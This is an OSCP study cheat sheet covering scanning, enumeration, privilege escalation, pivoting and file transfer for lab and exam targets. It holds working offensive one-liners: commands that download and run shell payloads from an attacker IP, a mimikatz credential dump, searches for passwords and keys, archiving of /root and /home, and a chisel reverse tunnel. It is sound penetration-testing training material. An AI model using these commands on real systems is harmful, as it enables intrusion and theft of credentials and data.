# OSCP: methodology (the mindset)

1. **Plan / Scope** — understand your allowed targets (lab/exam rules). Keep logs and screenshots of every action.
2. **Enumerate thoroughly** — start from network discovery → open ports → service/version → app fingerprinting → auth/paths/configs. One missed service = lost box.
3. **Exploit with care** — prefer manual exploitation or small, well-understood public exploits. Modify and understand every exploit you use.
4. **Post-exploit** — collect flags, credentials, local info; attempt privilege escalation methodically.
5. **Clean evidence & report** — keep clear steps, commands, screenshots, and timelines. Document everything.

---

# Quick workflow checklist

1. `nmap` scan (fast + full)
2. Service enumeration (HTTP, SMB, MSSQL, FTP, RPC, etc.)
3. Web probing: `gobuster` / `dirb` / `ffuf` / Burp passive/active
4. Auth bruteforce if allowed: `hydra`, `patator`, `medusa`
5. Exploit or manual abuse (upload webshells, LFI→RCE, SQLi→RCE, misconfig)
6. Post-exploit enumeration & creds extraction (files, configs, secrets)
7. Privilege escalation (local checks + automated helpers for checklist)
8. Persistence (only in lab/exam: ephemeral proof) / pivoting (SSH tunnels, socks)
9. Document everything — commands, output, screenshots.

# Nmap — scans & useful flags (copy/paste)

Quick host discovery:

```
nmap -sn -PE -PA21,23,80,3389 10.10.0.0/24
```

Top ports + service/version + scripts + OS detection:

```
nmap -sC -sV -p- -O --min-rate 1000 -oA scans/target_full 10.10.10.5
```

Alternative split approach (fast then heavy):

```
nmap -sS -p- --min-rate 1000 -T4 -oA scans/target_allports 10.10.10.5
nmap -sC -sV -p1-65535 -T4 -A -oA scans/target_version 10.10.10.5
```

Vuln scripts (example):

```
nmap --script vuln -p445,139 10.10.10.5 -oN nmap_vuln.txt
nmap -p80 --script http-enum,http-vhosts,vuln 10.10.10.5
```

# General enumeration: commands & one-liners

Get OS/network info (if you already have a shell):

```
uname -a
cat /etc/os-release
id
ip a
ip route
ss -tulpn
```

List installed packages / kernel:

```
dpkg -l | head
rpm -qa | head
cat /proc/version
```

Search for credentials, private keys, config files:

```
find / -type f -name "*.pem" 2>/dev/null
grep -Ri "password" / 2>/dev/null
grep -Ri "DB_PASSWORD" /var/www 2>/dev/null
```

Find SUID/SGID / world-writable:

```
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
```

Check sudo rights:

```
sudo -l
```

Check running services / processes:

```
ps aux --sort=-%mem | head
systemctl list-units --type=service --state=running
```

Check crontabs:

```
crontab -l 2>/dev/null
ls -la /etc/cron* && cat /etc/crontab
```

Check network connections and listening processes:

```
ss -tulpn
netstat -tulpn
lsof -i -P -n
```

Gather user data:

```
cat /etc/passwd
awk -F: '$3>=1000{print $1}' /etc/passwd
history
last
```

# Privilege escalation — Linux checklist & commands

1. `sudo -l` — check allowed cmds.
2. `find / -perm -4000 -type f 2>/dev/null` — SUID files.
3. `ps aux` & `systemctl` — misconfigured services, scripts.
4. `cat /etc/passwd`, `cat /etc/shadow` (if readable).
5. `ls -la /home`, search web app config files, `.my.cnf`, `.ssh` directories.
6. Kernel exploits: `uname -a` and check known vuln (only use in lab).
7. `getcap -r / 2>/dev/null` — capabilities.
8. `grep -R "password" /etc 2>/dev/null` and `grep -R "AWS" / 2>/dev/null` for keys.
9. `pspy` to watch cronjobs or scripts running as root.

Useful automated helpers (use as checklist, not final answer):

```
# Download linpeas
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Common SUID escalations examples:

```
# If /usr/bin/vim is SUID (rare), spawn shell:
vim -c ':!/bin/sh' -c ':q'
# Or if nano has privileges:
less /etc/shadow
```

# Privilege escalation — Windows checklist & commands

1. `whoami /priv` & `whoami /all`
2. `systeminfo` / `ver` / `wmic qfe get HotFixID, InstalledOn` — check patches
3. `net user` / `net localgroup administrators`
4. `schtasks /query /fo LIST /v` — scheduled tasks
5. `wmic service get name,displayname,pathname,startmode` — unquoted service path
6. `Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue` (PowerShell) — search for creds
7. Use **PowerUp** and **winPEAS** to enumerate weaknesses.

Typical privilege escalation methods:

* Unquoted service paths
* Weak service permissions
* AlwaysInstallElevated (registry check)
* Weak scheduled tasks
* Insecure token impersonation or service misconfiguration
* Plaintext creds in files / DBs / IIS configs
* Exploitable drivers or vulnerable patches

# Post-exploitation: data gathering & lateral movement

Collect host evidence and important files:

```
# Linux
tar czf /tmp/box_data_$(hostname).tgz /etc /home /var/www /root 2>/dev/null
# Windows (Powershell)
Get-ChildItem C:\inetpub -Recurse | Out-File C:\temp\files.txt
```

Dump hashes / creds:

```
# Linux
locate *.sql 2>/dev/null | xargs grep -i password 2>/dev/null
# Windows (if you have SYSTEM)
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Pivoting / tunneling:

```
# Create SOCKS proxy with SSH (if you have ssh to an internal host)
ssh -D 9050 -C -N user@internal
# Using chisel (client/server)
# On attacker:
./chisel server -p 8888 --reverse
# On pivot host (victim with outbound connectivity):
./chisel client attacker:8888 R:5555:127.0.0.1:3389
# Now on attacker: nc 127.0.0.1 5555 connects to internal RDP
```

ProxyChains for routing traffic:

```
proxychains4 nmap -sT -Pn -p 80 127.0.0.1
```

# Useful one-liners & file transfer methods

Python HTTP server:

```
# on attacker machine in folder with payloads
python3 -m http.server 8000
# on victim (download wget/curl):
wget http://10.10.14.2:8000/shell.elf
curl -O http://10.10.14.2:8000/shell.elf
```

Base64 transfer to avoid filters:

```
# On attacker:
base64 shell.elf > shell.b64
# On victim:
cat shell.b64 | base64 -d > shell.elf; chmod +x shell.elf; ./shell.elf
```

PowerShell file transfer:

```
# Attacker: serve file with Python
# Victim:
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.2/shell.exe','C:\\Windows\\Temp\\shell.exe')"
```

# Buffer overflow basics (OSCP practical)

1. Identify vuln via fuzzing (e.g., `pattern_create` / `pattern_offset`)
2. Determine offset, overwrite return address, control EIP/RIP.
3. Avoid badchars; use NOP sleds; test payload sizes.
4. Compile exploit with correct architecture.
   Tools:

* `gdb` / `gdb-peda` / `pwndbg`
* `pattern_create.rb` / `pattern_offset.rb` (metasploit tools)
* `objdump -d` / `readelf -s` / `file`
  Common commands:

```
# Create cyclic pattern (metasploit)
python3 -c 'from pwn import *; print(cyclic(500))'
# After crash, find offset 
# Using pattern_offset
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x6161616b)) # put crashed EIP value
PY
```

# Exam tips & best practices

* Time management: enumerate fast, prioritize low-hanging fruit.
* Keep a live running `notes.md` with command & output snippets; copy screenshots into report as you go.
* If stuck on one path > 45 minutes, switch to another machine or approach. (lab practice)
